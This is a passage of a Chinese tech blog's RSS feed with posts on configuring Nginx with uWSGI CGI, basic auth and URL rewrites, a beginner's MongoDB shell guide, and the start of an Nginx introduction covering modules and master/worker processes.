class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span>       mime.types;<span class="comment"># 多用途互联网邮件扩展（MIME，Multipurpose Internet Mail Extensions）</span></span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream;<span class="comment"># 这里设置类型</span></span><br><span class="line">    <span class="comment">#access_log  logs/access.log  main;# 访问日志</span></span><br><span class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>;</span><br><span class="line">    <span class="comment">#gzip  on;</span></span><br><span class="line">        </span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">charset</span> utf-<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> / &#123;</span><br><span class="line">            <span class="attribute">root</span>   html;</span><br><span class="line">            <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> /confs &#123;<span class="comment"># 路由</span></span><br><span class="line">            <span class="attribute">alias</span>   /data/_dir/nginx/www/mon_conf;</span><br><span class="line">            <span class="attribute">autoindex</span> <span class="literal">on</span>;             <span class="comment">#开启索引功能</span></span><br><span class="line">            <span class="attribute">autoindex_localtime</span> <span class="literal">on</span>;   <span class="comment"># 显示本机时间而非 GMT 时间</span></span><br><span class="line">            <span class="attribute">auth_basic</span> <span class="string">"Enter your name and password"</span>;</span><br><span class="line">            <span class="comment"># 指定验证文件</span></span><br><span class="line">            <span class="attribute">auth_basic_user_file</span> /data/_dir/nginx/www/mon_conf/.htpasswd;</span><br><span class="line">            <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="attribute">location</span> /query &#123;</span><br><span class="line">            <span class="attribute">rewrite</span><span class="regexp"> ^</span> /cgi-bin/query.py <span class="literal">last</span>;<span class="comment"># 这里的路由重写</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> /cgi-bin &#123;</span><br><span class="line">            internal;# 内部访问，外部访问时 404</span><br><span class="line">            <span class="attribute">include</span> uwsgi_params;</span><br><span class="line">            <span class="attribute">uwsgi_modifier1</span> <span class="number">9</span>;</span><br><span class="line">            <span class="attribute">uwsgi_pass</span> <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="页面的登入认证"><a href="#页面的登入认证" class="headerlink" title="页面的登入认证"></a>页面的登入认证</h4><p>由于这里可以直接进行文件访问，所以添加了页面的登陆验证</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">auth_basic</span> <span class="string">"Enter your name and password"</span>;</span><br><span class="line"><span class="attribute">auth_basic_user_file</span> /data/_dir/nginx/www/mon_conf/.htpasswd;</span><br></pre></td></tr></table></figure><blockquote><ul><li><span class="exturl" data-url="aHR0cDovL3Rvb2wub3NjaGluYS5uZXQvaHRwYXNzd2Q=" title="http://tool.oschina.net/htpasswd">在线 htpasswd 生成器<i class="fa fa-external-link"></i></span></li><li>htpasswd 是开源 http 服务器 <span class="exturl" data-url="aHR0cDovL3d3dy5vc2NoaW5hLm5ldC9wL2FwYWNoZStodHRwK3NlcnZlcg==" title="http://www.oschina.net/p/apache+http+server">apache httpd<i class="fa fa-external-link"></i></span> 的一个命令工具，用于生成 http 基本认证的密码文件。</li></ul></blockquote><p>这里简单的测试， <strong>admin:1234 (MD5)</strong> 得到密文</p><p><code>admin:$apr1$PqhZgBDT$pAwEYVAKKXdHIXxqvbEYU/</code></p><hr><h4 id="URL-的重写"><a href="#URL-的重写" class="headerlink" title="URL 的重写"></a>URL 的重写</h4><p>URL 的重写，这里实现的是隐式的重定向。就是我们的页面发生跳转，但是URL 不发生变化。</p><p>这里使用 nginx 的 rewrite 模块实现相关功能。具体配置如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /query &#123;</span><br><span class="line"><span class="attribute">rewrite</span><span class="regexp"> ^</span> /cgi-bin/query.py <span class="literal">last</span>;<span class="comment"># 这里的路由重写</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">location</span> /cgi-bin &#123;</span><br><span class="line">    internal;# 内部访问，外部访问时 404</span><br><span class="line">    <span class="attribute">include</span> uwsgi_params;</span><br><span class="line">    <span class="attribute">uwsgi_modifier1</span> <span class="number">9</span>;</span><br><span class="line">    <span class="attribute">uwsgi_pass</span> <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的CGI 部分和之前是没有什么区别，不过值得注意的是 ， 这里的internal 的修饰。说明这刚路由路径，不可以从外部进行访问。</p><p>所以在 这里进行了重定向 <code>rewrite ^ /cgi-bin/query.py last;</code> 对 query 进行重写，相对的就是对重写后的地方进行访问。</p><h5 id="rewrite-的标识"><a href="#rewrite-的标识" class="headerlink" title="rewrite  的标识"></a>rewrite  的标识</h5><p>不写last和break - 那么流程就是依次执行这些rewrite </p><ol><li>rewrite break - url重写后，直接使用当前资源，不再执行location里余下的语句，完成本次请求，地址栏url不变 </li><li>rewrite last - url重写后，马上发起一个新的请求，再次进入server块，重试location匹配，超过10次匹配不到报500错误，地址栏url不变 </li><li>rewrite redirect – 返回302临时重定向，地址栏显示重定向后的url，爬虫不会更新url（因为是临时） </li><li>rewrite permanent – 返回301永久重定向, 地址栏显示重定向后的url，爬虫更新url</li></ol><ul><li>引用自 <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5sYW5tZy9hcnRpY2xlL2RldGFpbHMvNDk2ODQ4MDM=" title="https://blog.csdn.net/zhanlanmg/article/details/49684803">Nginx中的rewrite指令(break,last,redirect,permanent)<i class="fa fa-external-link"></i></span></li></ul><h3 id="一些总结"><a href="#一些总结" class="headerlink" title="一些总结"></a>一些总结</h3><h4 id="502-和-504"><a href="#502-和-504" class="headerlink" title="502 和 504"></a>502 和 504</h4><ul><li>502        Bad Gateway<br>   504     Gateway time-out<br>   503        Service Unavailable</li></ul><p>正如其 英译过来， </p><ul><li>Bad Geteway        一般发生在当前的HTTP请求，在进行 CGI  分发的时候，发生错误，比如 :9000 端口连接失败。或者 CGI 服务没有启动<br>   Gateway time-out    Nginx 在进行任务分发之后，超过预定时间，没有得到 CGI 服务器的 echo，可能是 CGI 服务的进程阻塞<br>   Service Unavailable    由 CGI 服务直接返回，无法处理任务的请求，一般是流量太大导致的问题</li></ul><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly91d3NnaS1kb2NzLWNuLnJlYWR0aGVkb2NzLmlvL3poX0NOL2xhdGVzdC9pbmRleC5odG1s" title="https://uwsgi-docs-cn.readthedocs.io/zh_CN/latest/index.html">The uWSGI project<i class="fa fa-external-link"></i></span></li></ul></blockquote>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/09/09/OP_Nginx_CGI/#disqus_thread</comments>
    </item>
    
    <item>
      <title>MongoDB 简明入门</title>
      <link>https://www.diglp.xyz/2018/09/09/MangoDB/</link>
      <guid>https://www.diglp.xyz/2018/09/09/MangoDB/</guid>
      <pubDate>Sat, 08 Sep 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>多看看书，学点东西。</p><blockquote><p>工作是一方好药，让人很容易的走出焦虑</p></blockquote><hr><p>书中的内容，主要来自于 《mongoDB 权威指南》和 Google 。再加上点自己的思考了。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="简单几句话"><a href="#简单几句话" class="headerlink" title="简单几句话"></a>简单几句话</h3><p>MongoDB 是目前的主流 NoSQL 之一</p><blockquote><p>NoSQL = Not only SQL</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdmFqb3kvcC81NDcxMzA4Lmh0bWw=" title="https://www.cnblogs.com/vajoy/p/5471308.html">几款主流 NoSql 数据库的对比<i class="fa fa-external-link"></i></span></li></ul></blockquote><hr><ul><li><p>文档是MangoDB 的基本单元，换关系数据库中的行的概念相似，但是其具体结构复杂的多。</p></li><li><p>每个文档，都会有自己的一个特殊的键 <code>_id</code> 在文档所处的合集中是唯一的。</p></li><li><p>多个件及其关联的值放在一起便是文档。</p></li><li><p>合集就是一组文档</p></li><li><p>文档之于行，合集之于表。</p></li><li><p>集合是没有模式的，在关系数据库里面，每一行有固定的模式。但是在集合中是没有模式的。比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;a&apos;:123, &apos;c&apos;: 234&#125;</span><br><span class="line">&#123;&apos;d&apos;:354&#125;</span><br></pre></td></tr></table></figure></li><li><p>这样的文档就可以存在于一个集合里面。</p></li><li><p>Q:既然集合没有模式那么存在的意义是什么呢？</p><p>A:实际上集合，我们可以看作是一个数据关系，有关联的数据我们都可以放在一个集合里面，这样的话，就不会存在，在一堆不明事理的数据里面查找</p><p>使用 名字对集合进行标识</p><p>使用命名空间来划分子合集， 来体现更好的层次关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blog.posts</span><br><span class="line">blog.logs</span><br></pre></td></tr></table></figure></li><li><p>mongoDB 多个文档组成集合，多个集合便组成了数据库。</p></li><li><p>mongoDB ，默认监听端口 <strong>27017</strong>， 使用 <strong>28017</strong> 作为简易的 HTTP 管理。</p></li><li><p>mongoDB 自带了一个shell ，其具有完备的 JS 解释器的功能，甚至可以用来运行JS程序, 甚至可以使用 JS 的标准库，且可以使用多行命令。</p></li><li><p>在开启的时候，Shell 会自动连接数据库。mongoDB 的真正有魅力的地方在于此：数据库的连接直接赋值给全局变量 db。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; use test# 选中数据库</span><br><span class="line">&gt; db # JS 特性输出当却数据库的字符串</span><br><span class="line">&gt; db.test# 这里输出 test 库的 test 集合</span><br></pre></td></tr></table></figure></li></ul><p><strong>所以可见 mongoDB 在数据库的访问形式和传统的 关系数据库有了极大的改变。</strong></p><hr><p>MongoDB 用自己的话讲，它高度的封装了数据库，使用 <strong>键值对</strong> 的方案，很好的绕过了关系数据库中的，严格的数据模式。这样，数据本身的模式回去有了更大的自由，同一个合集下的记录里的内容可以各自不同。这样的数据库就有了更好的灵活性。于是这样，就可以很方便的封装了数据的增删查改的接口。不会想经典关系数据库中的，必须一个 列名一个 value的一样对应。</p><h3 id="MongoDB-基础"><a href="#MongoDB-基础" class="headerlink" title="MongoDB 基础"></a>MongoDB 基础</h3><p>正如 mysql 一样，拥有一个SQL语句的解释器，MongoDB 一样有一个，而且功能十分强大。</p><p>mongoDB 自带了一个shell ，其具有完备的 JS 解释器的功能，甚至可以用来运行JS程序, 甚至可以使用 JS 的标准库，且可以使用多行命令。</p><p>在这个SHELL 里面，数据库本身被封装成了一个全局变量db ，其他的基本操作，都成为了所定义的方法</p><ul><li><code>insert</code></li><li><code>find</code> /<code>findOne</code> </li><li><code>update</code></li><li><code>remove</code> </li></ul><blockquote><p><strong>tips</strong> ： 由于本身就是Javascript 的封装，所以，我们就可以巧用 db.funcname 来查看这个方法的定义，值得注意的是，这个后面是没有括号的哦，否则就变成了调用</p></blockquote><h4 id="Shell-中的-增删查改-简明"><a href="#Shell-中的-增删查改-简明" class="headerlink" title="Shell 中的 增删查改 简明"></a>Shell 中的 增删查改 简明</h4><blockquote><p>创建，读取，更新，删除 （CRUD）</p></blockquote><p>在shell中db 已经作为了一个变量，同样的这些操作，也已经被包装成了方法。</p><hr><h5 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h5><p>在创建的时候直接使用 <code>insert</code>给指定的数据集合，插入一个文档。eg：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post = &#123;&apos;content&apos;: &apos;hello&apos;&#125;#这里简单的定义一个文档</span><br><span class="line">db.test.insert(post)# 响集合内部插入一个文档</span><br></pre></td></tr></table></figure><hr><h5 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h5><p>读取文档时候可以使用 <code>find</code> 或者 <code>findOne</code> 用与文档的检索</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.test.find()# 这样会列出集合中的所有文档（默认前20条）</span><br><span class="line">db.test.findOne()# 单条查询</span><br></pre></td></tr></table></figure><p>当然在查找语句里面是可以使用限定条件的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.test.find(&#123;&apos;content&apos;: &apos;hello&apos;&#125;)# 找到所有conten键为 hello 的</span><br><span class="line">db.test.findOne(&#123;&apos;content&apos;: &apos;hello&apos;&#125;)# 同上，找到一条</span><br></pre></td></tr></table></figure><hr><h5 id="读取-1"><a href="#读取-1" class="headerlink" title="读取"></a>读取</h5><p>使用 <code>update</code> 对文档进行更新。同同样的可以使用限定条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post = &#123;&apos;content&apos;: &apos;world&apos;&#125;# 定义更新后的文档</span><br><span class="line">db.test.update(&#123;&apos;content&apos;: &apos;hello&apos;&#125;, post)</span><br></pre></td></tr></table></figure><hr><h5 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h5><p>删除就直接使用 <code>remove</code> ，一样的加上限定条件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.test.remove(&#123;&apos;content&apos;: &apos;hello&apos;&#125;)</span><br></pre></td></tr></table></figure><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>在MongoDB 里面不一样，数据的类型，和结构显得更加的多元化。甚至一个键的值可以是：</p><ul><li>对象ID    objectId()<br>   日期    new Date()<br>   代码    function({a=‘hello’})<br>   数组    [1,2,3,4,5]<br>   内嵌文档        如果作为字典理解的话，这个就是一个字典了。</li></ul><h4 id="ObjectId"><a href="#ObjectId" class="headerlink" title="ObjectId()"></a>ObjectId()</h4><p>这个方法是比较重要的一个 point 了。实际上这个是一个 MongoDB 的一个全局方法。用于生成一个独一无二的ID ，独一无二这个次是不是已经说明了什么？这里我们使用shell 调用几次：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; ObjectId()</span><br><span class="line">5b93fd4eab05d01ee4004b3b</span><br><span class="line">&gt; ObjectId()</span><br><span class="line">5b93fe01ab05d01ee4004b3c</span><br><span class="line">&gt; ObjectId()</span><br><span class="line">5b93fe08ab05d01ee4004b3d</span><br></pre></td></tr></table></figure><p>可以看到这个方法的返回值在不断递增。其具体构成规则如下：</p><p>​    0123    456         78        9 10 11</p><p>​    时间戳    机器    PID        计数器</p><p>这个ID 是独一无二的，顾名思义，对象ID ，一个ID 就对应了一个文档。这个 objectId 的方法，会在添加新的文档时自动调用，创建一个 <code>{&#39;_id&#39;: objectId()}</code> 的键值对。</p><hr><p>执行四次 <code>db.test.insert({&#39;word&#39;:&#39;hello&#39;})</code> 之后，列出当前合集，可见其内容</p><table><thead><tr><th>_id</th><th>word</th></tr></thead><tbody><tr><td>5b93f56eab05d01ee4004b33</td><td>hello</td></tr><tr><td>5b93f578ab05d01ee4004b34</td><td>hello</td></tr><tr><td>5b93f578ab05d01ee4004b35</td><td>hello</td></tr><tr><td>5b93f579ab05d01ee4004b36</td><td>hello</td></tr></tbody></table><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>技术本身在不断的，飞速的迭代着。从 Flash 到 安卓，到 Web。就在过去的短短十年，就有了这样的三座山峰。</p><p><img src="http://cdn.blog.ihuxu.com/wp-content/uploads/2018/05/530445922_1854089398_AE6F6133-239E-4ad9-8924-82A28BCC4A00.png" alt="lzxbdl"></p><p>不断的 GO forward ，才能走向浪潮之巅</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/09/09/MangoDB/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Nginx 简明入门</title>
      <link>https://www.diglp.xyz/2018/09/06/OP_Nginx%20%E7%9A%84%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/</link>
      <guid>https://www.diglp.xyz/2018/09/06/OP_Nginx%20%E7%9A%84%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/</guid>
      <pubDate>Wed, 05 Sep 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;Nginx 是个好东西。。。&lt;/p&gt;
&lt;p&gt;Nginx 的wiki
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>Nginx 是个好东西。。。</p><p>Nginx 的wiki 定义</p><blockquote><p><strong>Nginx</strong>（发音同engine x）是一个异步框架的 <span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU3JUI2JUIyJUU5JUEwJTgxJUU0JUJDJUJBJUU2JTlDJThEJUU1JTk5JUE4" title="https://zh.wikipedia.org/wiki/%E7%B6%B2%E9%A0%81%E4%BC%BA%E6%9C%8D%E5%99%A8">Web服务器<i class="fa fa-external-link"></i></span>，也可以用作<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU1JThGJThEJUU1JTkwJTkxJUU0JUJCJUEzJUU3JTkwJTg2" title="https://zh.wikipedia.org/wiki/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86">反向代理<i class="fa fa-external-link"></i></span>，<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU4JUI0JTlGJUU4JUJEJUJEJUU1JTlEJTg3JUU4JUExJUEx" title="https://zh.wikipedia.org/wiki/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">负载平衡器<i class="fa fa-external-link"></i></span> 和 <span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSFRUUCVFNyVCQyU5MyVFNSVBRCU5OA==" title="https://zh.wikipedia.org/wiki/HTTP%E7%BC%93%E5%AD%98">HTTP缓存<i class="fa fa-external-link"></i></span>。该软件由 <span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU0JUJDJThBJUU2JTg4JTg4JUU3JTg4JUJFJUMyJUI3JUU4JUIzJUJEJUU3JUI0JUEyJUU4JTgwJUI2JUU1JUE0JUFC" title="https://zh.wikipedia.org/wiki/%E4%BC%8A%E6%88%88%E7%88%BE%C2%B7%E8%B3%BD%E7%B4%A2%E8%80%B6%E5%A4%AB">Igor Sysoev<i class="fa fa-external-link"></i></span> 创建，并于2004年首次公开发布。<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvTmdpbngjY2l0ZV9ub3RlLU1vYmlseS02" title="https://zh.wikipedia.org/wiki/Nginx#cite_note-Mobily-6">[6]<i class="fa fa-external-link"></i></span> 同名公司成立于2011年，以提供支持。<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvTmdpbngjY2l0ZV9ub3RlLUQtNw==" title="https://zh.wikipedia.org/wiki/Nginx#cite_note-D-7">[7]<i class="fa fa-external-link"></i></span> </p></blockquote><p>平时或多或少的在使用 Nginx 这个服务，但是很少系统的去学习它。作为OP这个东西肯定是十分重要的，所以抽个时间和机会，系统的了解吧~ </p><p>这篇将是一个简明的入门笔记，也算得上的一本读书笔记了，陶利军老师的 《决战Nginx》</p><hr><p>Nginx :    2004/10/4    类BSD     C-language</p><p>web访问的顺序：web浏览器 -&gt; web服务器（狭义）-&gt; web容器 -&gt; 应用服务器 -&gt; 数据库服务器 </p><hr><p>这里强烈PICK 一下国内的 GITBOOK 平台 看云上的一个系列</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cua2FuY2xvdWQuY24vaGl5YW5nL25naW54LzM2NDc4MA==" title="https://www.kancloud.cn/hiyang/nginx/364780">NGINX-hiyang<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy52b2lkY24uY29tL2FydGljbGUvcC1vZHNzemZvcS1laC5odG1s" title="http://www.voidcn.com/article/p-odsszfoq-eh.html">web服务，服务器，容器，中间件<i class="fa fa-external-link"></i></span></li></ul><h2 id="NginX"><a href="#NginX" class="headerlink" title="NginX"></a>NginX</h2><h3 id="nginx-的作用-HTTP-svr"><a href="#nginx-的作用-HTTP-svr" class="headerlink" title="nginx 的作用: HTTP svr"></a>nginx 的作用: HTTP svr</h3><p>Nginx 严格意义上 称为 HTTP SEVRVER :: HTTP 协议层面的传输和访问控制,所以可以看到代理、负载均衡等功能。</p><p>客户端通过 HTTP Server 访问服务器上存储的资源（HTML 文件、图片文件等等）。通过 CGI 技术，可以实现对路由路径进行功能分发，但是一个 HTTP Server 始终只是把服务器上的文件如实的通过 HTTP 协议传输给客户端的这样的一个存在。</p><p>所以总结来讲， Nginx 严格意义上是一个 HTTP 服务器， 在主机上开放了HTTP 的响应端口，可以对我们的HTTP 的不同请求，进行不同的<code>任务分发</code>，注意这里不是响应，是内容分发。通过 Nginx 的配置，可以对不同的请求内容，分发到不同的任务去。</p><p>比如配置一个目录为图像目录，那么我就可以使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl www.imang.com/image/xxxx.jpg -v</span><br></pre></td></tr></table></figure><p>来进行一次图像的访问访问，这个内容便是通过 Nginx 进行配置的。</p><p>再者，我们可以是呀</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl www.imang.com/cgi-bin/xxxx -v</span><br></pre></td></tr></table></figure><p>这里可以进行一次 CGI 的请求，这里一样的的是Nginx的配置，把 cgi-bin 里面的xxxx 配置为我们的 本地脚本执行</p><hr><p>所以综上 Nginx 的作用就是把我们的HTTP 请求进行不同的任务下发，静态文件，CGI，负载均衡，etc</p><h3 id="Nginx-的基本模块"><a href="#Nginx-的基本模块" class="headerlink" title="Nginx 的基本模块"></a>Nginx 的基本模块</h3><p>Nginx 是基于模块化的构建方式。常用的用户配置有一些模块：</p><ul><li>内核模块            CoreModule<br>   事件驱动模块     EventModule<br>   HTTP内核模块    HttpCoreModule</li></ul><p>所以，我们的配置内容就存在上述的对应的三种配置，一些基本基本配置项</p><ul><li>CoreModule<ul><li>error_log    logs/error.log    用日志记录指定<br>   deamon        on | off            是否是守护进程，否则Nginx 只能进行前台运行<br>   include         file | *             这里用于引入其他配置文件，包含上面的事件配置，HTTP 配置，但不限于<br>   PID        指定Nginx 的 .pid 文件<br>   worker_cpu_affinity            worker cpu 亲和性，这个挺有意思，可以指定WOrker使用的CPU<br>   $pid     这个是个变量，或者说是宏，用于表示当前运行的服务器的PID<pre><code>EventModule    事件模块决定了 处理路由路径的 过程，一般缺省，对性能较大影响HttpCoreModule    Http服务器的基础配置模块</code></pre>   alias    定义路由结构 见后<br>   root    定义路由结构 见后<br>   error_page    [404/500] 这个用于对不同的错误码的返回配置，所以就有了 404 页面，不再是单独那几个字了<br>   internal    指定路径为内部访问，这里可以对路由路径进行内部连接，不允许用户从外部直接访问<br>   limit_except    [get/post]    这个可以对一个路径的 请求方式进行限制<br>   listen    [[ip]:port]    重要，指定虚拟服务器所监听的端口，见后<br>   localtion [通配] url {}    重要，对指定的URL配置到不同的访问<br>   post_action        一个请求完成之后所执行的URL，和Internal 连用<br>   server {}        用于虚拟主机的配置<br>   server_name []    匹配请求头中的Host 字段，www.example.com<br>   $args    变量，代表GET的请求行中的参数<br>   $request_uri    用户当前请求的原始 URI<br>   $uri     当前请求的URI ，可能发生内部重定向，所以不一定和上面的req 相同</li></ul></li></ul><hr><p>一个 Http 模块的配置示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">http &#123;  </span><br><span class="line">    server &#123;  </span><br><span class="line">        listen          80;  </span><br><span class="line">        server_name     www.domain1.com;  </span><br><span class="line">        access_log      logs/domain1.access.log main;  </span><br><span class="line">        location / &#123;  </span><br><span class="line">            index index.html;  </span><br><span class="line">            root  /web/www/domain1.com/htdocs;  </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">    server &#123;  </span><br><span class="line">        listen          80;  </span><br><span class="line">        server_name     www.domain2.com;  </span><br><span class="line">        access_log      logs/domain2.access.log main;  </span><br><span class="line">        location / &#123;  </span><br><span class="line">            index index.html;  </span><br><span class="line">            root  /web/www/domain2.com/htdocs;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    include    /opt/nginx/conf/vhosts/www.domain2.com.conf;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个内部重定向的实现 post_action</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">location /dosomething &#123;</span><br><span class="line">    internal;</span><br><span class="line">   proxy_pass http://127.0.0.1</span><br><span class="line">   post_action /afterdosomething</span><br><span class="line">&#125;</span><br><span class="line">location /dosomething &#123;</span><br><span class="line">internal;# 内部路径，外部无法访问</span><br><span class="line">fastcgi_pass 127.0.0.1/cgi# 这里也展现出了CGI</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Master-与-Worker"><a href="#Master-与-Worker" class="headerlink" title="Master 与 Worker"></a>Master 与 Worker</h3><p>Nginx 使用的是 Master-Worker 的这种结构。通俗讲，就是 包工头和工人。master负责端口服务，接收连接之后进行下发分配；worker 是负责连接连接内容处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps auxf | grep nginx</span><br><span class="line">root      6174  0.0  0.0  28876   428 ?        Ss   14:35   0:00 nginx: master process ./sbin/nginx</span><br><span class="line">root      6175  0.0  0.2  29364  2060 ?        S    14:35   0:00  \_ nginx: worker process</span><br></pre></td></tr></table></figure><p>这里可以看到，master和worker进程。</p><hr><p>对于 Master 进程我们可以给他发信号</p><table><thead><tr><th>信号</th><th>功能</th></tr></thead><tbody><tr><td>WINCH</td><td>Master 关闭所有的worker</td></tr><tr><td>HUP</td><td>重新装载Nginx 配置（服务重启动，同reload）,后面的PID使用了这个信号</td></tr></tbody></table><p>这里有个很有趣的东西，我们对 master发信号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -WINCH `cat /var/log/myserver.pid`</span><br></pre></td></tr></table></figure><p>之后，再进行我们的HTTP访问，发现可以进行连接，可是一直保持着加载，直到最后的超时。</p><p>因为，我们这里 让master kill 了所有的worker 。有人接活，没人干了，哈哈</p><h3 id="nginx-与-PHP"><a href="#nginx-与-PHP" class="headerlink" title="nginx 与 PHP"></a>nginx 与 PHP</h3><p>在网上看到一句话：</p><blockquote><p>Nginx 本身是不支持 PHP 